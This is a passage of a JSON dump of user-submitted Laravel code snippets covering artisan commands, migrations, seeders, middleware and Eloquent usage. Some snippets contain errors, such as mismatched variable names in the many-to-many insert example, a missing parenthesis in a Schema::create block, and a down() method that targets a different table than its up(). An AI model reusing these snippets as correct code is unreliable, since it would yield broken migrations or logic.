  },
  {
    "id": 2454,
    "keyword": null,
    "link": null,
    "title": " laravel make migration controller resource mcr",
    "description": "php artisan make:model Todo -mcr php artisan make:model <name> -mcr\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2455,
    "keyword": null,
    "link": null,
    "title": " laravel make migration update table",
    "description": "php artisan make:migration add_paid_to_users_table --table=users \nphp artisan make:migration update_user_guide_in_product_translations_table\nphp artisan make:migration update_description_in_products_table\ncomposer require --dev \"xethron/migrations-generator\"\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2456,
    "keyword": null,
    "link": null,
    "title": " laravel make migrattion",
    "description": "php artisan make:migration create_flights_table\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2457,
    "keyword": null,
    "link": null,
    "title": " laravel make model and migration",
    "description": "php artisan make:model Todo -mcr \nphp artisan make:model Model_Name -m\nphp artisan make:model ModelName --migration\nphp artisan make:model Settings -m\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:migration update_user_guide_in_product_translations_table\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2458,
    "keyword": null,
    "link": null,
    "title": " laravel make model with migration",
    "description": "php artisan make:model Todo -mcr \nphp artisan make:model Model_Name -m\nphp artisan make:model ModelName --migration\nphp artisan make:model Settings -m\nphp artisan make:model yourModelName --migration\nphp artisan make:model Settings --migration\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2459,
    "keyword": null,
    "link": null,
    "title": " laravel make model with migration 5.8",
    "description": "php artisan make:model Todo -mcr \nphp artisan make:model Settings -m\nphp artisan make:model Settings --migration \nphp artisan make:model yourModelName --migration\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2460,
    "keyword": null,
    "link": null,
    "title": " laravel make model with migration and controller",
    "description": "php artisan make:model Todo -mcr \nphp artisan make:model Settings -m\n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan make:model Todo -mcfr\nphp artisan make:model ModelName -mcr\nphp artisan make:model yourModelName --migration\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2461,
    "keyword": null,
    "link": null,
    "title": " laravel make seeder",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan db:seed --class=UserSeeder\nphp artisan make:seeder NameOfTheSeeder\nphp artisan migrate:fresh --seed\nphp artisan make:seeder UsersTableSeeder\n<?php  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n",
    "reg_date": "2021-10-12T10:16:18.000Z"
  },
  {
    "id": 2462,
    "keyword": null,
    "link": null,
    "title": " laravel make trait command",
    "description": "php artisan make:trait nameOfTheTrait \n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2463,
    "keyword": null,
    "link": null,
    "title": " laravel make view",
    "description": "php artisan make:view viewName\nphp artisan make:command MakeViewCommand\n@php     $user_id = Auth::user()->id; @endphp\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2464,
    "keyword": null,
    "link": null,
    "title": " laravel make view command",
    "description": "php artisan make:command MakeViewCommand\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2465,
    "keyword": null,
    "link": null,
    "title": " laravel many to many insert data",
    "description": "$user = User::find(2);    $roleIds = [1, 2]; $user->roles()->attach($roleIds);  $user = User::find(3);    $roleIds = [1, 2]; $user->roles()->sync($roleIds);\n$employee = employee::find(1);  $salary1 = new Salary; $salary->amount = '123456789'; $salary->payment_date = '15/07/2020';  $salary2 = new Salary; $salary->amount = '123456789'; $salary->payment_date = '16/07/2020';  $employee = $employee->salary()->saveMany([$salary1, $salary2]);\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2466,
    "keyword": null,
    "link": null,
    "title": " laravel many to many migration",
    "description": "php artisan make:migration create_posts_users_table\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2467,
    "keyword": null,
    "link": null,
    "title": " laravel meilisearch flush",
    "description": "php artisan scout:import \"App\\Models\\Post\" php artisan scout:flush \"App\\Models\\Post\"\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2468,
    "keyword": null,
    "link": null,
    "title": " laravel merge collections",
    "description": "$collection = collect([1, 2, 3, 4]);  $filtered = $collection->filter(function ($value, $key) {     return $value > 2; });  $filtered->all();  // [3, 4]\n/*   * The merge method merges the given array or collection with the original collection.  * If a string key in the given items matches a string key in the original collection,  * the given items's value will overwrite the value in the original collection:  */ $collection = collect(['product_id' => 1, 'price' => 100]); $merged = $collection->merge(['price' => 200, 'discount' => false]); $merged->all(); // ['product_id' => 1, 'price' => 200, 'discount' => false]  // If the given items's keys are numeric, the values will be appended to the end of the collection: $collection = collect(['Desk', 'Chair']); $merged = $collection->merge(['Bookcase', 'Door']); $merged->all(); // ['Desk', 'Chair', 'Bookcase', 'Door']\n$collection = collect(['product_id' => 1, 'price' => 100]);  $merged = $collection->merge(['price' => 200, 'discount' => false]);  $merged->all();  // ['product_id' => 1, 'price' => 200, 'discount' => false]\n$name = DB::table('users')->where('name', 'John')->pluck('name');\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2469,
    "keyword": null,
    "link": null,
    "title": " laravel merge two query builder",
    "description": "$page = Page::select('id as page_id','name_en as page_name');         $data['permissions'] = Permission::where('role_id', $id)->joinSub($page,'permissions_page',function($join){             $join->on('permissions.page_id','=','permissions_page.page_id');         })->get();\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2470,
    "keyword": null,
    "link": null,
    "title": " laravel meta csrf",
    "description": "$.ajaxSetup({    headers: {      'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')    } });\n<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">\n<form method=\"POST\" action=\"/profile\">     @csrf     <input name=\"name\">   \t<button type=\"submit\">send</button> </form>\n<form action=\"{{ url('my-url') }}\">    @csrf\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2471,
    "keyword": null,
    "link": null,
    "title": " laravel middleware group",
    "description": "Route::middleware(['first', 'second'])->group(function () {     Route::get('/', function () {         // Uses first & second middleware...     });      Route::get('/user/profile', function () {         // Uses first & second middleware...     }); });\nphp artisan make:middleware NameOfTheMiddleware\n<?php  namespace App\\Http\\Middleware;  use Closure;  class CheckAge {     /**      * Handle an incoming request.      *      * @param  \\Illuminate\\Http\\Request  $request      * @param  \\Closure  $next      * @return mixed      */     public function handle($request, Closure $next)     {         if ($request->age <= 200) {             return redirect('home');         }          return $next($request);     } }\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2472,
    "keyword": null,
    "link": null,
    "title": " laravel middleware in constructor",
    "description": "php artisan make:middleware nameOfMiddleware\npublic function __construct(User $user) {   \t$this->user = $user;        $this->middleware(function ($request, $next) {         $user = auth()->user();         if ($user) {           \t$this->user = $user;         }                return $next($request);     }); }\n<?php # Run: # php artisan make:middleware EnsureTokenIsValid    namespace App\\Http\\Middleware;  use Closure;  class EnsureTokenIsValid {     /**      * Handle an incoming request.      *      * @param  \\Illuminate\\Http\\Request  $request      * @param  \\Closure  $next      * @return mixed      */     public function handle($request, Closure $next)     {         if ($request->input('token') !== 'my-secret-token') {             return redirect('home');         }          return $next($request);     } }\n<?php  namespace App\\Http\\Middleware;  use Closure;  class CheckAge {     /**      * Handle an incoming request.      *      * @param  \\Illuminate\\Http\\Request  $request      * @param  \\Closure  $next      * @return mixed      */     public function handle($request, Closure $next)     {         if ($request->age <= 200) {             return redirect('home');         }          return $next($request);     } }\nphp artisan make:middleware <middleware-name> \nphp artisan make:middleware EnsureTokenIsValid\n",
    "reg_date": "2021-10-12T10:16:19.000Z"
  },
  {
    "id": 2473,
    "keyword": null,
    "link": null,
    "title": " laravel middleware route",
    "description": "Route::middleware([CheckAge::class])->group(function () {     Route::get('/', function () {         //     });      Route::get('admin/profile', function () {         //     })->withoutMiddleware([CheckAge::class]); });\n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2474,
    "keyword": null,
    "link": null,
    "title": " laravel migation error",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); } \n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2475,
    "keyword": null,
    "link": null,
    "title": " laravel migrate if not exists",
    "description": "if (!Schema::hasTable('tblCategory')) {      Schema::create('tblCategory', function($table){             $table->engine = 'InnoDB';             $table->increments('CategoryID');             $table->string('Category', 40);             $table->unique('Category', 'tblCategory_UK_Category');             $table->timestamps();     } } \nif (!Schema::hasTable('tblCategory')) {      Schema::create('tblCategory', function($table){             //...     } } \n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2476,
    "keyword": null,
    "link": null,
    "title": " laravel migrate in browser",
    "description": "\\Artisan::call('migrate',  array(    '--path' => 'database/migrations',    '--database' => 'dynamicdb',    '--force' => true));\n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2477,
    "keyword": null,
    "link": null,
    "title": " laravel migrate in production",
    "description": "\\Artisan::call('migrate',  array(    '--path' => 'database/migrations',    '--database' => 'dynamicdb',    '--force' => true));\n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2478,
    "keyword": null,
    "link": null,
    "title": " laravel migrate seed",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan migrate:refresh --seed\nphp artisan make:seeder NameOfTheSeeder\nphp artisan migrate:fresh --seed\nphp artisan make:model MODEL_PATH\\MODEL_NAME -ms    -m, --migration Create a new migration file for the model. -s, --seeder Create a new seeder file for the model.\nuse App\\Models\\User;  /**  * Run the database seeders.  *  * @return void  */ public function run() {     User::factory()             ->times(50)             ->hasPosts(1)             ->create(); }\n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2479,
    "keyword": null,
    "link": null,
    "title": " laravel migrate specific path",
    "description": "php artisan migrate --path=/database/migrations/ef php artisan migrate --path=/database/migrations/relations\n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2480,
    "keyword": null,
    "link": null,
    "title": " laravel migration",
    "description": "php artisan make:migration create_users_table \nphp artisan migrate:rollback\n// use the make:migration Artisan command to generate a database migration php artisan make:migration create_flights_table  // use --create to indicate whether the migration will be creating a new table php artisan make:migration create_flights_table --create=flights  // use --table to indicate the table name php artisan make:migration add_destination_to_flights_table --table=flights\nphp artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\n$table->string('name', 100);\n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2481,
    "keyword": null,
    "link": null,
    "title": " laravel migration add column after",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nclass AddProfileToUsers extends Migration {     /**      * Run the migrations.      *      * @return void      */     public function up()     {         Schema::table('users', function (Blueprint $table) {             $table->string('profile')->nullable();         });     }      /**      * Reverse the migrations.      *      * @return void      */     public function down()     {         Schema::table('shop_users', function (Blueprint $table) {             $table->dropColumn(['profile']);         });     } }\nphp artisan make:migration add_profile_to_users\nSchema::table('table_name', function (Blueprint $table) {             $table->string('column_name', 255)->nullable()->after('previous_column_name');         });\nSchema::table('users', function ($table) {     $table->string('email')->after('id')->nullable(); });\n",
    "reg_date": "2021-10-12T10:16:20.000Z"
  },
  {
    "id": 2482,
    "keyword": null,
    "link": null,
    "title": " laravel migration add column to existing table",
    "description": "php artisan make:migration add_paid_to_users_table --table=users    public function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }  php artisan migrate\n// for Laravel 5+ php artisan make:migration add_email_to_users_table --table=users  public function up() {     Schema::table('users', function($table) {         $table->integer('email');     }); }  public function down() {     Schema::table('users', function($table) {         $table->dropColumn('email');     }); }  php artisan migrate\nphp artisan make:migration add_paid_to_users_table --table=users\npublic function down() {     Schema::table('users', function($table) {         $table->dropColumn('paid');     }); }\nphp artisan make:migration add_paid_to_users_table --table=users \nclass AddProfileToUsers extends Migration {     /**      * Run the migrations.      *      * @return void      */     public function up()     {         Schema::table('users', function (Blueprint $table) {             $table->string('profile')->nullable();         });     }      /**      * Reverse the migrations.      *      * @return void      */     public function down()     {         Schema::table('shop_users', function (Blueprint $table) {             $table->dropColumn(['profile']);         });     } }\n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2483,
    "keyword": null,
    "link": null,
    "title": " laravel migration add datetime column with default",
    "description": "$table->timestamp('column_name')->useCurrent();\nLaravel Migration Datetime Now\n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2484,
    "keyword": null,
    "link": null,
    "title": " laravel migration add unique column",
    "description": "Schema::table('tableName', function($table) {     $table->string('column-name')->unique(); //notice the parenthesis I added });\n$table->dropUnique('users_email_unique');\n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2485,
    "keyword": null,
    "link": null,
    "title": " laravel migration alter column unique",
    "description": "Schema::table('tableName', function($table) {     $table->string('column-name')->unique(); //notice the parenthesis I added });\n$table->dropUnique('users_email_unique');\n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2486,
    "keyword": null,
    "link": null,
    "title": " laravel migration change column default",
    "description": "$table->string('name')->default('Hello World!');\n$table->increments('id');             $table->string('name');             $table->string('url');             $table->string('country');             $table->tinyInteger('status')->default('1');             $table->timestamps(); \nSchema::table('users', function ($table) {     $table->integer('active')->default(0)->change(); });\nSchema::table('users', function ($table) {     $table->integer('active')->default(0)->change(); }); \n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2487,
    "keyword": null,
    "link": null,
    "title": " laravel migration change column length",
    "description": "Schema::table('users', function ($table) {     $table->string('name', 50)->change(); });\nSchema::rename($currentTableName, $newTableName);\n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2488,
    "keyword": null,
    "link": null,
    "title": " laravel migration change column name",
    "description": "Schema::table('users', function (Blueprint $table) {     $table->renameColumn('from', 'to'); });\nSchema::table('users', function (Blueprint $table) {     $table->string('name', 50)->nullable()->change(); });\npublic function up() {     Schema::table('sometable', function (Blueprint $table) {         $table->text('text')->change();     }); }\nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\npublic function down() {     Schema::table('posts', function (Blueprint $table) {         $table->renameColumn('user_id', 'author_ID');     }); } \npublic function up() {     Schema::table('posts', function (Blueprint $table) {         $table->renameColumn('author_ID', 'user_id');     }); } \n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2489,
    "keyword": null,
    "link": null,
    "title": " laravel migration change column type",
    "description": "Schema::table('users', function (Blueprint $table) {     $table->renameColumn('from', 'to'); });\nSchema::table('users', function ($table) {     $table->string('name', 50)->change(); }); We could also modify a column to be nullable:  Schema::table('users', function ($table) {     $table->string('name', 50)->nullable()->change(); });\npublic function up() {     Schema::table('sometable', function (Blueprint $table) {         $table->text('text')->change();     }); }\nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\nSchema::table('users', function ($table) {     $table->string('email')->after('id')->nullable(); });\n$table->bigInteger('votes');\n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2490,
    "keyword": null,
    "link": null,
    "title": " laravel migration change default value",
    "description": "$table->string('name')->default('Hello World!');\n$table->increments('id');             $table->string('name');             $table->string('url');             $table->string('country');             $table->tinyInteger('status')->default('1');             $table->timestamps(); \nSchema::table('users', function ($table) {     $table->integer('active')->default(0)->change(); });\nSchema::table('users', function ($table) {     $table->integer('active')->default(0)->change(); }); \n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2491,
    "keyword": null,
    "link": null,
    "title": " laravel migration check if table has column",
    "description": "// You may check for the existence of a table or column // using the hasTable and hasColumn methods:  if (Schema::hasTable('users')) {     // The \"users\" table exists... }  if (Schema::hasColumn('users', 'email')) {     // The \"users\" table exists and has an \"email\" column... }\nSchema::hasColumn('users', 'email') // laravel\n",
    "reg_date": "2021-10-12T10:16:21.000Z"
  },
  {
    "id": 2492,
    "keyword": null,
    "link": null,
    "title": " laravel migration default value",
    "description": "$table->string('name')->default('Hello World!');\n$table->increments('id');             $table->string('name');             $table->string('url');             $table->string('country');             $table->tinyInteger('status')->default('1');             $table->timestamps(); \n$table->timestamp('created_at')->default(DB::raw('CURRENT_TIMESTAMP'));\nSchema::table('users', function ($table) {     $table->integer('active')->default(0)->change(); });\nSchema::table('users', function ($table) {     $table->integer('active')->default(0)->change(); }); \nqueryInterface.addColumn('OrderBackups', 'my_column', {   type: Sequelize.INTEGER,   defaultValue: 0 })\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2493,
    "keyword": null,
    "link": null,
    "title": " laravel migration index",
    "description": "Schema::table('tableName', function($table) {     $table->string('column-name')->unique(); //notice the parenthesis I added });\n// To drop a column, use the dropColumn method on the schema builder. // Before dropping columns from a SQLite database, you will need to add // the doctrine/dbal dependency to your composer.json file and run the // composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn('votes'); });\n$table->index(['account_id', 'created_at']);\n<?php  use Illuminate\\Database\\Migrations\\Migration; use Illuminate\\Database\\Schema\\Blueprint; use Illuminate\\Support\\Facades\\Schema; use Illuminate\\Support\\Facades\\DB;  class Products extends Migration {     /**      * Run the migrations.      *      * @return void      */     public function up()     {         Schema::create('products', function (Blueprint $table) {             $table->id();             $table->string('product_name')->index('product_name');             $table->string('product_sku')->index('product_sku');         });     }      /**      * Reverse the migrations.      *      * @return void      */     public function down()     {         Schema::dropIfExists('products');     } }\n$table->string('name', 100);\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2494,
    "keyword": null,
    "link": null,
    "title": " laravel migration integer",
    "description": "$table->integer('votes');\n$table->bigInteger('votes');\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2495,
    "keyword": null,
    "link": null,
    "title": " laravel migration make auto increment",
    "description": "$table->increments('id');\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2496,
    "keyword": null,
    "link": null,
    "title": " laravel migration make column nullable",
    "description": "Schema::table('users', function($table) {     $table->string('name', 50)->nullable()->change(); });  This is the correct syntax to revert the migration:  $table->integer('user_id')->unsigned()->nullable(false)->change(); \n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2497,
    "keyword": null,
    "link": null,
    "title": " laravel migration on delete set null",
    "description": "$table->...->onDelete('set null');\n$table->foreignId('user_id')       ->constrained()       ->onDelete('cascade');\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2498,
    "keyword": null,
    "link": null,
    "title": " laravel migration price",
    "description": "$this->decimal('price', 10, 2); \n$table->foreign('column_name')->references('id')->on('table_name')->onDelete('cascade');\n//to create migration file in PHP use the artisan command \"make\" php artisan make:migration create_users_table // migration file must follow the naming convention \"operation_tableName_table\" //Migration file to add column naming convention would be \"add_tablename_table\"\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2499,
    "keyword": null,
    "link": null,
    "title": " laravel migration remove column",
    "description": "public function up() {   Schema::table('table', function($table) {     $table->dropColumn('column_name');   }); }\n Class RemoveCommentViewCount extends Migration   {       public function up()       {           Schema::table('articles', function($table) {              $table->dropColumn('comment_count');              $table->dropColumn('view_count');           });       }        public function down()       {           Schema::table('articles', function($table) {              $table->integer('comment_count');              $table->integer('view_count');           });       }   }\n// To drop a column, use the dropColumn method on the schema builder. // Before dropping columns from a SQLite database, you will need to add // the doctrine/dbal dependency to your composer.json file and run the // composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn('votes'); });\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2500,
    "keyword": null,
    "link": null,
    "title": " laravel migration remove unique",
    "description": "/** To drop an index you must specify the index's name.  Laravel assigns a reasonable name to the indexes by default.  Simply concatenate the table name, the names of the column in the index,  and the index type **/  // Format of unique key tableName_column_unique $table->dropUnique('users_email_unique');\n//The UNique need be a constraint name // This name has this format: // [TABLE_NAME]_[COLUMN_NAME]_unique // For 'users' table and 'user_code' column, whe get the name: // users_user_code_unique $table->dropUnique('users_user_code_unique');  //The inverst is  $table->unique('user_code');\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2501,
    "keyword": null,
    "link": null,
    "title": " laravel migration remove unique constraint",
    "description": "/** To drop an index you must specify the index's name.  Laravel assigns a reasonable name to the indexes by default.  Simply concatenate the table name, the names of the column in the index,  and the index type **/  // Format of unique key tableName_column_unique $table->dropUnique('users_email_unique');\n//The UNique need be a constraint name // This name has this format: // [TABLE_NAME]_[COLUMN_NAME]_unique // For 'users' table and 'user_code' column, whe get the name: // users_user_code_unique $table->dropUnique('users_user_code_unique');  //The inverst is  $table->unique('user_code');\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2502,
    "keyword": null,
    "link": null,
    "title": " laravel migration rollback",
    "description": "php artisan migrate:rollback --step=1\nphp artisan migrate:rollback\nTo rollback one step:  php artisan migrate:rollback  To rollback multiple steps:  php artisan migrate:rollback --step=[x]    To drop all tables and reload all migrations:  php artisan migrate:fresh\n$ php artisan migrate:fresh  Dropped all tables successfully. Migration table created successfully. Migrating: 2014_10_12_000000_create_users_table Migrated:  2014_10_12_000000_create_users_table Migrating: 2014_10_12_100000_create_password_resets_table Migrated:  2014_10_12_100000_create_password_resets_table \nphp artisan migrate:status\nphp artisan make:migration CreateUsersTable\n",
    "reg_date": "2021-10-12T10:16:22.000Z"
  },
  {
    "id": 2503,
    "keyword": null,
    "link": null,
    "title": " laravel migration seed fresh",
    "description": "php artisan make:model MODEL_PATH\\MODEL_NAME -mcrs or php artisan make:model MODEL_PATH\\MODEL_NAME -a    -a, --all Generate a migration, factory, and resource controller for the model  -m, --migration Create a new migration file for the model. -c, --controller Create a new controller for the model. -r, --resource Indicates if the generated controller should be a resource controller -s, --seeder Create a new seeder file for the model.\nphp artisan migrate:fresh --seed\nphp artisan make:model MODEL_PATH\\MODEL_NAME -ms    -m, --migration Create a new migration file for the model. -s, --seeder Create a new seeder file for the model.\n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2504,
    "keyword": null,
    "link": null,
    "title": " laravel migration set default value",
    "description": "$table->string('name')->default('Hello World!');\n$table->increments('id');             $table->string('name');             $table->string('url');             $table->string('country');             $table->tinyInteger('status')->default('1');             $table->timestamps(); \nSchema::table('users', function ($table) {     $table->integer('active')->default(0)->change(); });\nSchema::table('users', function ($table) {     $table->integer('active')->default(0)->change(); }); \n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2505,
    "keyword": null,
    "link": null,
    "title": " laravel migration update table column type",
    "description": "Schema::table('users', function ($table) {     $table->string('name', 50)->change(); }); We could also modify a column to be nullable:  Schema::table('users', function ($table) {     $table->string('name', 50)->nullable()->change(); });\npublic function up() {     Schema::table('sometable', function (Blueprint $table) {         $table->text('text')->change();     }); }\n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2506,
    "keyword": null,
    "link": null,
    "title": " laravel migration with primary key",
    "description": "$table->string('code', 30)->primary(); \n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2507,
    "keyword": null,
    "link": null,
    "title": " laravel migrations generator laravel",
    "description": "// use the make:migration Artisan command to generate a database migration php artisan make:migration create_flights_table  // use --create to indicate whether the migration will be creating a new table php artisan make:migration create_flights_table --create=flights  // use --table to indicate the table name php artisan make:migration add_destination_to_flights_table --table=flights\nUse this package https://github.com/oscarafdev/migrations-generator composer require oscarafdev/migrations-generator --dev Run php artisan migrate:generate to create migrations for all the tables,  or you can specify the tables you wish to generate using  php artisan migrate:generate table1,table2,table3,table4,table5.  You can also ignore tables with --ignore=\"table3,table4,table5\"  You can check this out(Never tested this before) https://github.com/Xethron/migrations-generator composer require --dev \"xethron/migrations-generator\"\nphp artisan make:Model Product -m -c  --resource\n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2508,
    "keyword": null,
    "link": null,
    "title": " laravel mix purge css",
    "description": "npm install laravel-mix-purgecss --save-dev    const mix = require('laravel-mix'); require('laravel-mix-purgecss');  // ...  mix.js('resources/js/app.js', 'public/js')    .sass('resources/sass/app.scss', 'public/css')    .purgeCss(); //Add this line and that'll do the job\n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2509,
    "keyword": null,
    "link": null,
    "title": " laravel mixed content error",
    "description": "When changing from http to https, it's possible to get the problem Mixed content issue - Content must be served as HTTPS.  So, first modify APP_URL in the .env file, if we use the assets helper, this shouldn't give any problem with the URL.  APP_URL=https://mydomain.com  Finally, add the following to the beginning of api.php or web.php:  if (App::environment('production')) {     URL::forceScheme('https'); }\n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2510,
    "keyword": null,
    "link": null,
    "title": " laravel model casts",
    "description": "<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class User extends Model {     /**      * The attributes that should be cast.      *      * @var array      */     protected $casts = [         'options' => 'array',     ]; }\nTo define a mutator, define a setFooAttribute method on your model where Foo   is the \"studly\" cased name of the column you wish to access. So, again, lets define a mutator for the first_name attribute. This mutator will be automatically called when we attempt to set the value of the first_name attribute on the model:  class User extends Model {     public function setFirstNameAttribute($value)     {         $this->attributes['first_name'] = strtolower($value);     } }\nOnce the cast is defined, you may access   the options attribute and    it will automatically be deserialized    from JSON into a PHP array. When you set    the value of the options attribute, the given    array will automatically be serialized back into    JSON for storage:   use App\\Models\\User;  $user = User::find(1);  $options = $user->options;  $options['key'] = 'value';  $user->options = $options;  $user->save();\n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2511,
    "keyword": null,
    "link": null,
    "title": " laravel model events",
    "description": "# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\nDB::table('users')             ->where('id', 1)             ->update(['votes' => 1]);\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\nclass User extends Model  {      public static function boot()     {         parent::boot();          self::creating(function($model){             // ... code here         });          self::created(function($model){             // ... code here         });          self::updating(function($model){             // ... code here         });          self::updated(function($model){             // ... code here         });          self::deleting(function($model){             // ... code here         });          self::deleted(function($model){             // ... code here         });     }  } \n",
    "reg_date": "2021-10-12T10:16:23.000Z"
  },
  {
    "id": 2512,
    "keyword": null,
    "link": null,
    "title": " laravel model exists id",
    "description": "if (DB::table('orders')->where('finalized', 1)->doesntExist()) {     // ... }\nif (User::where('email', '=', Input::get('email'))->exists()) {    // user found }\n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2513,
    "keyword": null,
    "link": null,
    "title": " laravel model guarded",
    "description": "/**  * The attributes that aren't mass assignable.  *  * @var array  */ protected $guarded = [];\n// If there's a flight from Oakland to San Diego, set the price to $99. // If no matching model exists, create one. $flight = App\\Models\\Flight::updateOrCreate(     ['departure' => 'Oakland', 'destination' => 'San Diego'],     ['price' => 99, 'discounted' => 1] );\n$flight = App\\Models\\Flight::find(1);  $flight->name = 'New Flight Name';  $flight->save();\n",
    "reg_date": "2021-10-12T10:16:24.000Z"
  },
  {
    "id": 2514,
    "keyword": null,
    "link": null,
    "title": " laravel model id string",
